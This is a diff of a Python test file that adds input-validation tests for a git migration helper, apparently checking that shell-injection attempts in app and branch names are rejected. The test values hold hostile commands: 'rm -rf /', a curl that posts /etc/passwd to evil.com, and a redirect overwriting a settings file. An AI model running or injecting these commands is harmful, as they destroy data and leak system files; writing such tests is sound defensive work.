@@ -93,13 +93,23 @@ class TestGetLatestMigrationInGit:
 
         assert result == ""
 
-    def test_raises_on_unsafe_app_name(self):
+    def test_raises_on_app_name_with_semicolon(self):
         with pytest.raises(ValueError, match="Invalid app_name"):
             get_latest_migration_in_git(app_name="my app; rm -rf /", branch_name="main")
 
-    def test_raises_on_unsafe_branch_name(self):
+    def test_raises_on_app_name_with_pipe_and_quote(self):
+        # e.g. myapp" | curl -d @/etc/passwd https://evil.com #
+        with pytest.raises(ValueError, match="Invalid app_name"):
+            get_latest_migration_in_git(app_name='myapp" | curl -d @/etc/passwd https://evil.com #', branch_name="main")
+
+    def test_raises_on_branch_name_with_semicolon(self):
         with pytest.raises(ValueError, match="Invalid branch_name"):
             get_latest_migration_in_git(app_name="myapp", branch_name="main; rm -rf /")
+
+    def test_raises_on_branch_name_with_ampersand_and_redirect(self):
+        # e.g. main && echo 'malicious' > /app/settings.py
+        with pytest.raises(ValueError, match="Invalid branch_name"):
+            get_latest_migration_in_git(app_name="myapp", branch_name="main && echo 'malicious' > /app/settings.py")
 
     @patch("migration_rollback.utils.migration_utils.Popen")
     def test_returns_migration_number(self, mock_popen):
